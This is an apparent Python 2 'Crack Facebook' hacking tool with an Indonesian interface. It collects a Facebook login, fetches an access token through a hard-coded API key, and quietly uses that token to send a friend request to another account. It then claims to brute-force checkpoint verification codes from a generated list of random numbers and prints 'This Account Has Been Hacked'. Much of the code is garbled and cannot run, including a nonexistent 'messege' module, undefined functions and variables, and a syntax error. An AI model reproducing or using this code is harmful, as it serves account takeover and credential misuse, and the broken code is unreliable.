#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,smtplib,messege
os.system('rm -rf .txt')
for n in range(2000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('code.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 upil.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,smtplib,messege
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 8.1.0; id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Selamat Tinggal '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


id = []
code = []
msg = []
code_list = []


##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
    os.system('clear')
    try:
        toket = open('login.txt','r')
        menu() 
    except (KeyError,IOError):
        os.system('clear')
        time.sleep(0.05)
        print logo
        jalan('\033[1;96m[!] \x1b[1;34mJangan Menggunakan akun fb lama' )
	jalan('\033[1;96m[!] \x1b[1;34mGunakan akun baru/via token' )
	print 42*"\033[1;96m="
	id = raw_input('\033[1;96m[!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
	pwd = raw_input('\033[1;96m[!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
	print 42*"\033[1;96m="
	tik()
	try:
		br.open('https://m.facebook.com')
	except mechanize.URLError:
		print"\n\x1b[1;97mThere is no internet connection"
		keluar()
	br._factory.is_html = True
	br.select_form(nr=0)
	br.form['email'] = id
	br.form['pass'] = pwd
	br.submit()
	url = br.geturl()
	if 'save-device' in url:
		try:
			sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
			x=hashlib.new("md5")
			x.update(sig)
			a=x.hexdigest()
			data.update({'sig':a})
			url = "https://api.facebook.com/restserver.php"
			r=requests.get(url,params=data)
			z=json.loads(r.text)
			unikers = open("login.txt", 'w')
			unikers.write(z['access_token'])
			unikers.close()
			jalan( '\n\x1b[1;95mLogin Successful...') 
			os.system('xdg-open https://www.facebook.com/dogukan.er.144')
			requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
			menu()
		except requests.exceptions.ConnectionError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
	if 'checkpoint' in url:
		print("\n\x1b[1;97mSepertinya Akun Anda Terkena Checkpoint")
		os.system('rm -rf login.txt')
		lanjut = raw_input("\003[1;31mLanjutkan Untuk Konfirmasi Akun CP ")
		if lanjut == "Tidak":
			login()
		elif lanjut =="OK":
			code()
		elif lanjut =="":
			os.system('rm -rf login.txt')
			login()
			time.sleep(1)
			
	else:
		print("\n\x1b[1;93mPassword/Email Anda Salah")
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()


def main():
	print '[1] mulai'
	print '[2] keluar'
	option = input('==>')
	if option == 1:
		code_txt = raw_input('code file :')
	else:
		system('clear')
		exit()
	code_txt = open('code.txt','r')
	code_list = pass_file.readlines()


def code():
	i = 0
	os.system('clear')
	try:
		toket = open('login.txt','r')
		login()
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		print("\033[1;93mKonfirmasi Code Email Anda")
		codem = raw_input("\033[1;34mEmail : ")
		from = requests.get("Facebook • security@facebookmail.com")
		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
		server.ehlo()
		for code in code_list:
			i = i + 1
			print str(i) + '/' + str(len(code_list))
			try:
				v = server.messege(codem, from)
				s = json.loadd(v,text)
				telok = open('code.txt', 'r')
				system('clear')
				main()
				print '\n'
				print '[+] This Account Has Been Hacked code :' + telok
				break
			except smtplib.SMTPAuthenticationError as e:
				error = str(e)
			if error[14] == '<':
				system('clear')
				main()
				print '[+] this account has been hacked, code :' + telok

				break
			else:
				print '[!] Code not found => ' + telok
				login()


if __name__=='__main__':
	login()
